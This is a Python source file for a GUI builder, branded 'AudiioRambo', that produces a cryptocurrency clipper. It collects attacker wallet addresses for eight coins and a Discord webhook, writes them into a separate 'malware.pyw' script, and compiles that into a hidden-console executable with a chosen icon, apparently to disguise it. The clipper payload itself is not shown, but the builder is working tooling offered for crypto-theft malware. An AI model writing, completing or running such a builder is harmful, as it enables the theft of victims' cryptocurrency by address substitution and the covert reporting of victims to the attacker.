import customtkinter as ctk
import os
import random
from tkinter import filedialog

# Initialize the GUI window
ctk.set_appearance_mode("dark")  # "dark", "light", or "system"
ctk.set_default_color_theme("green")  # Available themes: "blue", "dark-blue", "green"

app = ctk.CTk()
app.geometry("700x900")  # Slightly taller to accommodate webhook field
app.title("AudiioRambo - Crypto Clipper Builder")

# Apply a custom background color and make it darker
background_frame = ctk.CTkFrame(app, fg_color="#0A0A0A", corner_radius=10)
background_frame.pack(fill="both", expand=True, padx=10, pady=10)

# Font Styles
font_title = ("Courier New", 28, "bold")  # Hacker-style font
font_label = ("Courier New", 14)
font_button = ("Courier New", 14, "bold")

# Flickering Title Logic
title_text = "AUDIORAMBO CLIPPER"
title_label = ctk.CTkLabel(background_frame, text=title_text, font=font_title, text_color="green")
title_label.pack(pady=20)

def flicker_title():
    text = ""
    for char in title_text:
        if random.random() < 0.5:
            text += random.choice(["0", "1", char])
        else:
            text += char
    title_label.configure(text=text, text_color=random.choice(["#00FF00", "#00C800", "#009600"]))  # Green shades
    app.after(100, flicker_title)  # Flicker every 100ms

flicker_title()

# Instruction Label
instruction_label = ctk.CTkLabel(background_frame, text="[+] Enter crypto addresses and select which ones to use:", font=font_label, text_color="#00FF00")
instruction_label.pack(pady=10)

# Dictionary to store checkboxes and input fields
crypto_options = {
    "BTC": None, "ETH": None, "LTC": None, "XMR": None,
    "SOL": None, "DOGE": None, "XRP": None, "TRX": None
}
crypto_vars = {}

# Create checkboxes and input fields for each crypto type
for crypto in crypto_options.keys():
    frame = ctk.CTkFrame(background_frame, fg_color="#1A1A1A", corner_radius=8)  # Darker frame
    frame.pack(fill="x", padx=20, pady=5)

    crypto_vars[crypto] = ctk.IntVar()
    checkbox = ctk.CTkCheckBox(frame, text=crypto, variable=crypto_vars[crypto], text_color="#00FF00")
    checkbox.pack(side="left", padx=10)

    entry = ctk.CTkEntry(frame, placeholder_text=f"Enter {crypto} Address", fg_color="#2A2A2A", text_color="#00FF00")  # Darker entry
    entry.pack(side="left", fill="x", expand=True, padx=5)

    crypto_options[crypto] = entry

# Discord Webhook Input
webhook_frame = ctk.CTkFrame(background_frame, fg_color="#1A1A1A", corner_radius=8)
webhook_frame.pack(fill="x", padx=20, pady=10)

webhook_label = ctk.CTkLabel(webhook_frame, text="Discord Webhook:", font=font_label, text_color="#00FF00")
webhook_label.pack(side="left", padx=10)

webhook_entry = ctk.CTkEntry(webhook_frame, placeholder_text="Enter Discord Webhook URL", 
                            fg_color="#2A2A2A", text_color="#00FF00", width=400)
webhook_entry.pack(side="left", fill="x", expand=True, padx=5)

# Icon file selection
icon_path = ctk.StringVar()

def select_icon():
    file_path = filedialog.askopenfilename(filetypes=[("Icon Files", "*.ico")])
    if file_path:
        icon_path.set(file_path)
        icon_label.configure(text=f"[+] Icon Selected: {file_path.split('/')[-1]}", text_color="#FFFF00")

# Icon Selection Button
icon_label = ctk.CTkLabel(background_frame, text="[-] No icon selected", font=font_label, text_color="#00FF00")
icon_label.pack(pady=5)

icon_button = ctk.CTkButton(background_frame, text="[+] Choose Icon", command=select_icon, font=font_button, fg_color="#33691E", hover_color="#1B5E20")  # Green button
icon_button.pack(pady=5)

# Function to build the executable
def build_malware():
    selected_addresses = {}
    webhook_url = webhook_entry.get().strip()

    for crypto, entry in crypto_options.items():
        if crypto_vars[crypto].get() == 1:  # If the checkbox is checked
            address = entry.get().strip()
            if address:
                selected_addresses[crypto] = address

    try:
        # Embed addresses and webhook into the malware.pyw script
        with open("malware.pyw", "r", encoding="utf-8") as f:
            lines = f.readlines()

        # Find and replace both crypto_addresses and webhook_url
        for i, line in enumerate(lines):
            if line.strip().startswith("crypto_addresses = {"):
                lines[i] = f"crypto_addresses = {selected_addresses}\n"
            elif line.strip().startswith('webhook_url = "'):
                lines[i] = f'webhook_url = "{webhook_url}"\n' if webhook_url else 'webhook_url = ""\n'

        # Write the modified content back
        with open("malware.pyw", "w", encoding="utf-8") as f:
            f.writelines(lines)

        # Build the executable with PyInstaller
        icon_cmd = f"--icon={icon_path.get()}" if icon_path.get() else ""
        os.system(f'pyinstaller --onefile --noconsole {icon_cmd} malware.pyw')

        result_label.configure(text="[+] Build complete! Executable created.", text_color="#00FF00")
    except Exception as e:
        result_label.configure(text=f"[!] Error: {str(e)}", text_color="#FF0000")

# Build Button
build_button = ctk.CTkButton(background_frame, text="[+] Build Executable", command=build_malware, font=font_button, fg_color="#D32F2F", hover_color="#B71C1C")  # Red button for build
build_button.pack(pady=20)

# Result Label
result_label = ctk.CTkLabel(background_frame, text="", font=font_label, text_color="#00FF00")
result_label.pack(pady=10)

# Run the GUI
app.mainloop()